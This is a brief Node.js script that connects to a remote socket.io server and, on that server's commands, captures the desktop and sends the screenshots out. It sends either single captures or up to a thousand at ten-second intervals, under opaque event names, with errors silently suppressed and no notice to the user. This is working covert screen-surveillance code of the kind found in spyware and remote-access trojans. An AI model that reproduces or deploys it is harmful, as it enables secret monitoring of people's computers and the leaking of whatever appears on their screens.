"use strict";
const screenshot = require("screenshot-desktop");
var Config = require("./config");
var stop = 1;
var socket = require("socket.io-client")(
  Config.API_URL
);
function start(counter) {
  if (counter < stop) {
    setTimeout(function () {
      counter++;
      screenshot()
        .then((img) => {
          socket.emit("kaphwan", img);
        })
        .catch((err) => {
          // ...
        });
      start(counter);
    }, 10000);
  }
}
socket.on("auto", function (){
  stop = 1000;
  start(0);
})
socket.on("join", function () {
  socket.emit("join", `${Config.CLIENT}|computer`);
});
socket.on("kim", function (data) {
  stop = 0;
  screenshot()
    .then((img) => {
      socket.emit("kaphwan", img);
    })
    .catch((err) => {
    });
});
